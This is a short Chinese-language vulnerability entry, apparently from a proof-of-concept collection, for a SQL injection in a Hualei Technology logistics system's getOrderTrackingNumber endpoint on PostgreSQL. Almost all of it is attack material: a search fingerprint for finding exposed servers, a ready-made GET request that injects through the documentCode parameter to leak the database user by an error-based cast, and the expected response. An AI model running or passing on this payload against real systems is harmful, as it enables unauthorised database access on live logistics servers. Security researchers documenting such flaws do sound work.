# 华磊科技物流-getOrderTrackingNumber-pg-SQL注入漏洞

华磊科技物流-getOrderTrackingNumber-pg ｜ SQL注入 ｜ —
- **指纹**：`body="l_c_bar"`
- **请求**：`GET /getOrderTrackingNumber.htm?documentCode=a%27and%0A1=user::integer-- HTTP/1.1`
- **响应特征**：200